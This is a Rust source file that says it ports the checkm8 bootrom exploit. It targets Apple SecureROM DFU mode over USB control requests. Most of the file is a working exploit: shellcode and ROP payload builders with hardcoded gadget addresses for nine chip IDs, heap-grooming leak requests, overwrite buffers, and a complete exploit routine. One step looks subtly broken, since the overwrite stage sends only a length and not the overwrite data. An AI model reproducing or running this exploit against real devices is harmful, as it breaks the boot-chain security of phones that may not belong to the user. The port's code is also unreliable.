//! Port of `checkm8.py`: the stack overflow that gives pwned DFU over USB control requests.
//! Credit: axi0mX.

use std::thread::sleep;
use std::time::{Duration, Instant};

use crate::dfu;
use crate::libusb::{self, Device};
use crate::shellcode::{
    self, asm_arm64_branch, asm_arm64_x7_trampoline, asm_thumb_trampoline, Arch,
};
use crate::utilities::die;

pub const PAYLOAD_OFFSET_ARMV7: u64 = 384;
pub const PAYLOAD_SIZE_ARMV7: u64 = 320;
pub const PAYLOAD_OFFSET_ARM64: u64 = 384;
pub const PAYLOAD_SIZE_ARM64: u64 = 576;

pub struct DeviceConfig {
    pub version: &'static str,
    pub cpid: u32,
    /// Number of leak requests to issue before the heap grooming, if using the large leak.
    pub large_leak: Option<usize>,
    pub overwrite: Vec<u8>,
    pub hole: Option<usize>,
    pub leak: Option<usize>,
}

// --- libusb request helpers ----------------------------------------------

/// `checkm8.stall`: an async GET_DESCRIPTOR that is cancelled almost immediately.
fn stall(device: &Device) {
    libusb::async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, &[b'A'; 0xC0], 0.00001);
}
#[allow(dead_code)] // defined for parity with the original
fn leak(device: &Device) {
    libusb::no_error_ctrl_in(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1);
}
fn no_leak(device: &Device) {
    libusb::no_error_ctrl_in(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1);
}
fn usb_req_stall(device: &Device) {
    libusb::no_error_ctrl_out(device, 0x2, 3, 0x0, 0x80, &[], 10);
}
fn usb_req_leak(device: &Device) {
    libusb::no_error_ctrl_in(device, 0x80, 6, 0x304, 0x40A, 0x40, 1);
}
fn usb_req_no_leak(device: &Device) {
    libusb::no_error_ctrl_in(device, 0x80, 6, 0x304, 0x40A, 0x41, 1);
}

// --- payload construction -------------------------------------------------

/// `checkm8.usb_rop_callbacks`: builds the callback list consumed by the WXN disabled
/// payload's return-oriented-programming trampoline.
fn usb_rop_callbacks(mut address: u64, func_gadget: u64, callbacks: &[(u64, u64)]) -> Vec<u8> {
    let mut data = Vec::new();
    for i in (0..callbacks.len()).step_by(5) {
        let mut block1 = Vec::new();
        let mut block2 = Vec::new();
        for j in 0..5 {
            address += 0x10;
            if j == 4 {
                address += 0x50;
            }
            let index = i + j;
            if index < callbacks.len() - 1 {
                block1.extend_from_slice(&func_gadget.to_le_bytes());
                block1.extend_from_slice(&address.to_le_bytes());
                block2.extend_from_slice(&callbacks[index].1.to_le_bytes());
                block2.extend_from_slice(&callbacks[index].0.to_le_bytes());
            } else if index == callbacks.len() - 1 {
                block1.extend_from_slice(&func_gadget.to_le_bytes());
                block1.extend_from_slice(&0u64.to_le_bytes());
                block2.extend_from_slice(&callbacks[index].1.to_le_bytes());
                block2.extend_from_slice(&callbacks[index].0.to_le_bytes());
            } else {
                block1.extend_from_slice(&0u64.to_le_bytes());
                block1.extend_from_slice(&0u64.to_le_bytes());
            }
        }
        data.extend_from_slice(&block1);
        data.extend_from_slice(&block2);
    }
    data
}

/// Pad `data` to `width` bytes with zeros.
fn padded(data: &[u8], width: usize) -> Vec<u8> {
    let mut out = data.to_vec();
    out.resize(width, 0);
    out
}

/// `checkm8.payload(cpid)`
pub fn payload(cpid: u32) -> Vec<u8> {
    match cpid {
        0x8947 => {
            let constants_usb = [
                0x3400_0000u64,
                0x6578_6563,
                0x646F_6E65,
                0x6D65_6D63,
                0x6D65_6D73,
                0x79EC + 1,
            ];
            let constants_checkm8 = [
                0x3402_D87Cu64,
                0x3402_DDF8,
                0x72A8 + 1,
                0x3402_C2DA,
                0x3403_9800,
                PAYLOAD_OFFSET_ARMV7,
                PAYLOAD_SIZE_ARMV7,
                0x3402_D92C,
            ];
            let handler = [
                asm_thumb_trampoline(0x3403_9800 + 1, 0x7BC8 + 1),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARMV7,
                    Arch::Armv7,
                    &constants_usb,
                )[8..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARMV7,
                Arch::Armv7,
                &constants_checkm8,
            );
            assemble_armv7(shellcode, handler)
        }

        0x8950 => {
            let constants_usb = [
                0x1000_0000u64,
                0x6578_6563,
                0x646F_6E65,
                0x6D65_6D63,
                0x6D65_6D73,
                0x7620 + 1,
            ];
            let constants_checkm8 = [
                0x1006_1988u64,
                0x1006_1F80,
                0x7C54 + 1,
                0x1006_00D8,
                0x1007_9800,
                PAYLOAD_OFFSET_ARMV7,
                PAYLOAD_SIZE_ARMV7,
                0x1006_1A24,
            ];
            let handler = [
                asm_thumb_trampoline(0x1007_9800 + 1, 0x8160 + 1),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARMV7,
                    Arch::Armv7,
                    &constants_usb,
                )[8..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARMV7,
                Arch::Armv7,
                &constants_checkm8,
            );
            assemble_armv7(shellcode, handler)
        }

        0x8955 => {
            let constants_usb = [
                0x1000_0000u64,
                0x6578_6563,
                0x646F_6E65,
                0x6D65_6D63,
                0x6D65_6D73,
                0x7660 + 1,
            ];
            let constants_checkm8 = [
                0x1006_1988u64,
                0x1006_1F80,
                0x7C94 + 1,
                0x1006_00D8,
                0x1007_9800,
                PAYLOAD_OFFSET_ARMV7,
                PAYLOAD_SIZE_ARMV7,
                0x1006_1A24,
            ];
            let handler = [
                asm_thumb_trampoline(0x1007_9800 + 1, 0x81A0 + 1),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARMV7,
                    Arch::Armv7,
                    &constants_usb,
                )[8..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARMV7,
                Arch::Armv7,
                &constants_checkm8,
            );
            assemble_armv7(shellcode, handler)
        }

        0x8960 => {
            let constants_usb = [
                0x1803_80000u64,
                0x6578_6563_6578_6563,
                0x646F_6E65_646F_6E65,
                0x6D65_6D63_6D65_6D63,
                0x6D65_6D73_6D65_6D73,
                0x1000_0CC78,
            ];
            let constants_checkm8 = [
                0x1800_86B58u64,
                0x1800_86CDC,
                0x1000_0BFEC,
                0x1800_80562,
                0x1803_7FC00,
                PAYLOAD_OFFSET_ARM64,
                PAYLOAD_SIZE_ARM64,
                0x1800_86C70,
            ];
            let handler = [
                asm_arm64_x7_trampoline(0x1000_0CFB4),
                asm_arm64_branch(0x10, 0x0).to_vec(),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARM64,
                    Arch::Arm64,
                    &constants_usb,
                )[4..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARM64,
                Arch::Arm64,
                &constants_checkm8,
            );
            assemble_arm64(shellcode, handler)
        }

        0x8002 => {
            let constants_usb = [
                0x4881_8000u64,
                0x6578_6563,
                0x646F_6E65,
                0x6D65_6D63,
                0x6D65_6D73,
                0x9410 + 1,
            ];
            let constants_checkm8 = [
                0x4880_629Cu64,
                0x4880_2AB8,
                0x8CA4 + 1,
                0x4880_037A,
                0x4880_6E00,
                PAYLOAD_OFFSET_ARMV7,
                PAYLOAD_SIZE_ARMV7,
                0x4880_6344,
            ];
            let handler = [
                asm_thumb_trampoline(0x4880_6E00 + 1, 0x95F0 + 1),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARMV7,
                    Arch::Armv7,
                    &constants_usb,
                )[8..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARMV7,
                Arch::Armv7,
                &constants_checkm8,
            );
            assemble_armv7(shellcode, handler)
        }

        0x8004 => {
            let constants_usb = [
                0x4881_8000u64,
                0x6578_6563,
                0x646F_6E65,
                0x6D65_6D63,
                0x6D65_6D73,
                0x85A0 + 1,
            ];
            let constants_checkm8 = [
                0x4880_62DCu64,
                0x4880_2AE8,
                0x7E34 + 1,
                0x4880_03CA,
                0x4880_6E00,
                PAYLOAD_OFFSET_ARMV7,
                PAYLOAD_SIZE_ARMV7,
                0x4880_6384,
            ];
            let handler = [
                asm_thumb_trampoline(0x4880_6E00 + 1, 0x877C + 1),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARMV7,
                    Arch::Armv7,
                    &constants_usb,
                )[8..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARMV7,
                Arch::Armv7,
                &constants_checkm8,
            );
            assemble_armv7(shellcode, handler)
        }

        0x8010 => {
            let constants_usb = [
                0x1800_B0000u64,
                0x6578_6563_6578_6563,
                0x646F_6E65_646F_6E65,
                0x6D65_6D63_6D65_6D63,
                0x6D65_6D73_6D65_6D73,
                0x1000_0DC98,
            ];
            let constants_checkm8 = [
                0x1800_88A30u64,
                0x1800_83CF8,
                0x1000_0D150,
                0x1800_805DA,
                0x1800_AFC00,
                PAYLOAD_OFFSET_ARM64,
                PAYLOAD_SIZE_ARM64,
                0x1800_88B48,
            ];

            let func_gadget = 0x1000_0CC4Cu64;
            let enter_critical_section = 0x1000_0A4B8u64;
            let exit_critical_section = 0x1000_0A514u64;
            let dc_civac = 0x1000_0046Cu64;
            let write_ttbr0 = 0x1000_003E4u64;
            let tlbi = 0x1000_00434u64;
            let dmb = 0x1000_00478u64;
            let handle_interface_request = 0x1000_0DFB8u64;
            let callbacks: [(u64, u64); 10] = [
                (dc_civac, 0x1800_B0600),
                (dmb, 0),
                (enter_critical_section, 0),
                (write_ttbr0, 0x1800_B0000),
                (tlbi, 0),
                (0x1820_B0610, 0),
                (write_ttbr0, 0x1800_A0000),
                (tlbi, 0),
                (exit_critical_section, 0),
                (0x1800_B0000, 0),
            ];
            let handler = [
                asm_arm64_x7_trampoline(handle_interface_request),
                asm_arm64_branch(0x10, 0x0).to_vec(),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARM64,
                    Arch::Arm64,
                    &constants_usb,
                )[4..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARM64,
                Arch::Arm64,
                &constants_checkm8,
            );
            let payload = assemble_arm64(shellcode, handler);
            assert!(payload.len() <= 0x400);

            // struct.pack('<1024sQ504x2Q496s32x', ...)
            let mut out = padded(&payload, 1024);
            out.extend_from_slice(&0x1000_006A5u64.to_le_bytes());
            out.resize(out.len() + 504, 0);
            out.extend_from_slice(&0x0060_0001_8000_0625u64.to_le_bytes());
            out.extend_from_slice(&0x1800_006A5u64.to_le_bytes());
            out.extend_from_slice(&padded(shellcode::T8010_T8011_DISABLE_WXN_ARM64, 496));
            out.resize(out.len() + 32, 0);
            out.extend_from_slice(&usb_rop_callbacks(0x1800_B0800, func_gadget, &callbacks));
            out
        }

        0x8011 => {
            let constants_usb = [
                0x1800_B0000u64,
                0x6578_6563_6578_6563,
                0x646F_6E65_646F_6E65,
                0x6D65_6D63_6D65_6D63,
                0x6D65_6D73_6D65_6D73,
                0x1000_0DD64,
            ];
            let constants_checkm8 = [
                0x1800_88948u64,
                0x1800_83D28,
                0x1000_0D234,
                0x1800_8062A,
                0x1800_AFC00,
                PAYLOAD_OFFSET_ARM64,
                PAYLOAD_SIZE_ARM64,
                0x1800_88A58,
            ];

            let func_gadget = 0x1000_0CCECu64;
            let dc_civac = 0x1000_0047Cu64;
            let write_ttbr0 = 0x1000_003F4u64;
            let tlbi = 0x1000_00444u64;
            let dmb = 0x1000_00488u64;
            let handle_interface_request = 0x1000_0E08Cu64;
            let callbacks: [(u64, u64); 9] = [
                (dc_civac, 0x1800_B0600),
                (dc_civac, 0x1800_B0000),
                (dmb, 0),
                (write_ttbr0, 0x1800_B0000),
                (tlbi, 0),
                (0x1820_B0610, 0),
                (write_ttbr0, 0x1800_A0000),
                (tlbi, 0),
                (0x1800_B0000, 0),
            ];
            let handler = [
                asm_arm64_x7_trampoline(handle_interface_request),
                asm_arm64_branch(0x10, 0x0).to_vec(),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARM64,
                    Arch::Arm64,
                    &constants_usb,
                )[4..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARM64,
                Arch::Arm64,
                &constants_checkm8,
            );
            let payload = assemble_arm64(shellcode, handler);
            assert!(payload.len() <= 0x400);

            let mut out = padded(&payload, 1024);
            out.extend_from_slice(&0x1000_006A5u64.to_le_bytes());
            out.resize(out.len() + 504, 0);
            out.extend_from_slice(&0x0060_0001_8000_0625u64.to_le_bytes());
            out.extend_from_slice(&0x1800_006A5u64.to_le_bytes());
            out.extend_from_slice(&padded(shellcode::T8010_T8011_DISABLE_WXN_ARM64, 496));
            out.resize(out.len() + 32, 0);
            out.extend_from_slice(&usb_rop_callbacks(0x1800_B0800, func_gadget, &callbacks));
            out
        }

        0x8015 => {
            let constants_usb = [
                0x1800_1C000u64,
                0x6578_6563_6578_6563,
                0x646F_6E65_646F_6E65,
                0x6D65_6D63_6D65_6D63,
                0x6D65_6D73_6D65_6D73,
                0x1000_0B9A8,
            ];
            let constants_checkm8 = [
                0x1800_08528u64,
                0x1800_03A78,
                0x1000_0AE80,
                0x1800_008FA,
                0x1800_1BC00,
                PAYLOAD_OFFSET_ARM64,
                PAYLOAD_SIZE_ARM64,
                0x1800_08638,
            ];

            let load_write_gadget = 0x1000_0945Cu64;
            let write_sctlr_gadget = 0x1000_003ECu64;
            let func_gadget = 0x1000_0A9ACu64;
            let write_ttbr0 = 0x1000_0045Cu64;
            let tlbi = 0x1000_004ACu64;
            let dc_civac = 0x1000_004D0u64;
            let dmb = 0x1000_004F0u64;
            let handle_interface_request = 0x1000_0BCCCu64;
            let callbacks: [(u64, u64); 13] = [
                (dc_civac, 0x1800_1C800),
                (dc_civac, 0x1800_1C840),
                (dc_civac, 0x1800_1C880),
                (dmb, 0),
                (write_sctlr_gadget, 0x100D),
                (load_write_gadget, 0x1800_1C000),
                (load_write_gadget, 0x1800_1C010),
                (write_ttbr0, 0x1800_20000),
                (tlbi, 0),
                (load_write_gadget, 0x1800_1C020),
                (write_ttbr0, 0x1800_0C000),
                (tlbi, 0),
                (0x1800_1C800, 0),
            ];
            let callback_data = usb_rop_callbacks(0x1800_1C020, func_gadget, &callbacks);
            let handler = [
                asm_arm64_x7_trampoline(handle_interface_request),
                asm_arm64_branch(0x10, 0x0).to_vec(),
                shellcode::prepare_shellcode(
                    shellcode::USB_0XA1_2_ARM64,
                    Arch::Arm64,
                    &constants_usb,
                )[4..]
                    .to_vec(),
            ]
            .concat();
            let shellcode = shellcode::prepare_shellcode(
                shellcode::CHECKM8_ARM64,
                Arch::Arm64,
                &constants_checkm8,
            );
            let payload = assemble_arm64(shellcode, handler);

            // struct.pack('<6Q16x448s1536x1024s', ...)
            let mut out = Vec::new();
            for value in [
                0x1800_20400u64 - 8,
                0x1000_006A5,
                0x1800_20600 - 8,
                0x1800_00625,
                0x1800_0C600 - 8,
                0x1800_00625,
            ] {
                out.extend_from_slice(&value.to_le_bytes());
            }
            out.resize(out.len() + 16, 0);
            out.extend_from_slice(&padded(&callback_data, 448));
            out.resize(out.len() + 1536, 0);
            out.extend_from_slice(&padded(&payload, 1024));
            out
        }

        other => die(format!(
            "ERROR: No checkm8 payload for CPID 0x{:x}. Exiting.",
            other
        )),
    }
}

fn assemble_armv7(shellcode: Vec<u8>, handler: Vec<u8>) -> Vec<u8> {
    assert!(
        shellcode.len() as u64 <= PAYLOAD_OFFSET_ARMV7,
        "checkm8: armv7 shellcode does not fit in the payload offset"
    );
    assert!(
        handler.len() as u64 <= PAYLOAD_SIZE_ARMV7,
        "checkm8: armv7 handler does not fit in the payload size"
    );
    let mut out = padded(&shellcode, PAYLOAD_OFFSET_ARMV7 as usize);
    out.extend_from_slice(&handler);
    out
}

fn assemble_arm64(shellcode: Vec<u8>, handler: Vec<u8>) -> Vec<u8> {
    assert!(
        shellcode.len() as u64 <= PAYLOAD_OFFSET_ARM64,
        "checkm8: arm64 shellcode does not fit in the payload offset"
    );
    assert!(
        handler.len() as u64 <= PAYLOAD_SIZE_ARM64,
        "checkm8: arm64 handler does not fit in the payload size"
    );
    let mut out = padded(&shellcode, PAYLOAD_OFFSET_ARM64 as usize);
    out.extend_from_slice(&handler);
    out
}

/// `checkm8.all_exploit_configs()`
pub fn all_exploit_configs() -> Vec<DeviceConfig> {
    const T8010_NOP_GADGET: u64 = 0x1000_0CC6C;
    const T8011_NOP_GADGET: u64 = 0x1000_0CD0C;
    const T8015_NOP_GADGET: u64 = 0x1000_0A9C4;

    // struct.pack('<20xI4x', base) prefixed by zero padding
    let arm_overwrite = |prefix: usize, base: u32| -> Vec<u8> {
        let mut out = vec![0u8; prefix];
        out.resize(out.len() + 20, 0);
        out.extend_from_slice(&base.to_le_bytes());
        out.resize(out.len() + 4, 0);
        out
    };

    let s5l8947x_overwrite = arm_overwrite(0x660, 0x3400_0000);
    let s5l895xx_overwrite = arm_overwrite(0x640, 0x1000_0000);
    let t800x_overwrite = arm_overwrite(0x5C0, 0x4881_8000);

    // struct.pack('<32xQ8x', 0x180380000)
    let mut s5l8960x_overwrite = vec![0u8; 0x580];
    s5l8960x_overwrite.resize(s5l8960x_overwrite.len() + 32, 0);
    s5l8960x_overwrite.extend_from_slice(&0x1803_80000u64.to_le_bytes());
    s5l8960x_overwrite.resize(s5l8960x_overwrite.len() + 8, 0);

    // struct.pack('<32x2Q16x32x2QI', nop, rop, nop, rop, 0xbeefbeef)
    let arm64_rop_overwrite = |prefix: usize, nop: u64, rop: u64| -> Vec<u8> {
        let mut out = vec![0u8; prefix];
        out.resize(out.len() + 32, 0);
        out.extend_from_slice(&nop.to_le_bytes());
        out.extend_from_slice(&rop.to_le_bytes());
        out.resize(out.len() + 16, 0);
        out.resize(out.len() + 32, 0);
        out.extend_from_slice(&nop.to_le_bytes());
        out.extend_from_slice(&rop.to_le_bytes());
        out.extend_from_slice(&0xbeef_beefu32.to_le_bytes());
        out
    };

    let t8010_overwrite = arm64_rop_overwrite(0x580, T8010_NOP_GADGET, 0x1800_B0800);
    let t8011_overwrite = arm64_rop_overwrite(0x500, T8011_NOP_GADGET, 0x1800_B0800);

    // struct.pack('<32x2Q16x32x2Q12xI', nop, rop, nop, rop, 0xbeefbeef)
    let mut t8015_overwrite = vec![0u8; 0x500];
    t8015_overwrite.resize(t8015_overwrite.len() + 32, 0);
    t8015_overwrite.extend_from_slice(&T8015_NOP_GADGET.to_le_bytes());
    t8015_overwrite.extend_from_slice(&0x1800_1C020u64.to_le_bytes());
    t8015_overwrite.resize(t8015_overwrite.len() + 16, 0);
    t8015_overwrite.resize(t8015_overwrite.len() + 32, 0);
    t8015_overwrite.extend_from_slice(&T8015_NOP_GADGET.to_le_bytes());
    t8015_overwrite.extend_from_slice(&0x1800_1C020u64.to_le_bytes());
    t8015_overwrite.resize(t8015_overwrite.len() + 12, 0);
    t8015_overwrite.extend_from_slice(&0xbeef_beefu32.to_le_bytes());

    vec![
        // S5L8947 (DFU loop)
        DeviceConfig {
            version: "iBoot-1458.2",
            cpid: 0x8947,
            large_leak: Some(626),
            overwrite: s5l8947x_overwrite,
            hole: None,
            leak: None,
        },
        // S5L8950 (buttons)
        DeviceConfig {
            version: "iBoot-1145.3",
            cpid: 0x8950,
            large_leak: Some(659),
            overwrite: s5l895xx_overwrite.clone(),
            hole: None,
            leak: None,
        },
        // S5L8955 (buttons)
        DeviceConfig {
            version: "iBoot-1145.3.3",
            cpid: 0x8955,
            large_leak: Some(659),
            overwrite: s5l895xx_overwrite.clone(),
            hole: None,
            leak: None,
        },
        // S5L8960 (buttons)
        DeviceConfig {
            version: "iBoot-1704.10",
            cpid: 0x8960,
            large_leak: Some(7936),
            overwrite: s5l8960x_overwrite,
            hole: None,
            leak: None,
        },
        // T8002 (DFU loop)
        DeviceConfig {
            version: "iBoot-2651.0.0.1.31",
            cpid: 0x8002,
            large_leak: None,
            overwrite: t800x_overwrite.clone(),
            hole: Some(5),
            leak: Some(1),
        },
        // T8004 (buttons)
        DeviceConfig {
            version: "iBoot-2651.0.0.3.3",
            cpid: 0x8004,
            large_leak: None,
            overwrite: t800x_overwrite,
            hole: Some(5),
            leak: Some(1),
        },
        // T8010 (buttons)
        DeviceConfig {
            version: "iBoot-2696.0.0.1.33",
            cpid: 0x8010,
            large_leak: None,
            overwrite: t8010_overwrite,
            hole: Some(5),
            leak: Some(1),
        },
        // T8011 (buttons)
        DeviceConfig {
            version: "iBoot-3135.0.0.2.3",
            cpid: 0x8011,
            large_leak: None,
            overwrite: t8011_overwrite,
            hole: Some(6),
            leak: Some(1),
        },
        // T8015 (DFU loop)
        DeviceConfig {
            version: "iBoot-3332.0.0.1.23",
            cpid: 0x8015,
            large_leak: None,
            overwrite: t8015_overwrite,
            hole: Some(6),
            leak: Some(1),
        },
    ]
}

/// `checkm8.exploit_config(serial_number)`
fn exploit_config(serial_number: &str) -> (Vec<u8>, DeviceConfig) {
    let configs = all_exploit_configs();
    for config in &configs {
        if serial_number.contains(&format!("SRTG:[{}]", config.version)) {
            return (payload(config.cpid), clone_config(config));
        }
    }
    for config in &configs {
        if serial_number.contains(&format!("CPID:{:x}", config.cpid)) {
            println!("ERROR: CPID is compatible, but serial number string does not match.");
            println!(
                "Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting."
            );
            std::process::exit(1);
        }
    }
    die("ERROR: This is not a compatible device. Exiting.");
}

fn clone_config(config: &DeviceConfig) -> DeviceConfig {
    DeviceConfig {
        version: config.version,
        cpid: config.cpid,
        large_leak: config.large_leak,
        overwrite: config.overwrite.clone(),
        hole: config.hole,
        leak: config.leak,
    }
}

/// `checkm8.exploit`
pub fn exploit() {
    println!("*** checkm8 exploit by axi0mX ***");

    let start = Instant::now();
    let device = dfu::acquire_device();
    println!("Found: {}", device.serial_number);
    if device.serial_number.contains("PWND:[") {
        println!("Device is already in pwned DFU Mode. Not executing exploit.");
        return;
    }
    let serial_number = device.serial_number.clone();
    let (payload, config) = exploit_config(&serial_number);

    if let Some(large_leak) = config.large_leak {
        usb_req_stall(&device);
        for _ in 0..large_leak {
            usb_req_leak(&device);
        }
        usb_req_no_leak(&device);
    } else {
        stall(&device);
        for _ in 0..config.hole.unwrap() {
            no_leak(&device);
        }
        usb_req_leak(&device);
        no_leak(&device);
    }
    dfu::usb_reset(&device);
    drop(device);

    let device = dfu::acquire_device();
    libusb::async_ctrl_transfer(&device, 0x21, 1, 0, 0, &[b'A'; 0x800], 0.0001);
    libusb::no_error_ctrl_out(&device, 0x21, 4, 0, 0, &[], 0);
    drop(device);

    sleep(Duration::from_millis(500));

    let device = dfu::acquire_device();
    usb_req_stall(&device);
    if config.large_leak.is_some() {
        usb_req_leak(&device);
    } else {
        for _ in 0..config.leak.unwrap() {
            usb_req_leak(&device);
        }
    }
    libusb::no_error_ctrl_in(&device, 0, 0, 0, 0, config.overwrite.len(), 100);
    for chunk in payload.chunks(0x800) {
        libusb::no_error_ctrl_out(&device, 0x21, 1, 0, 0, chunk, 100);
    }
    dfu::usb_reset(&device);
    drop(device);

    let device = dfu::acquire_device();
    if !device.serial_number.contains("PWND:[checkm8]") {
        die("ERROR: Exploit failed. Device did not enter pwned DFU Mode.");
    }
    println!("Device is now in pwned DFU Mode.");
    println!("({:.2} seconds)", start.elapsed().as_secs_f64());
}
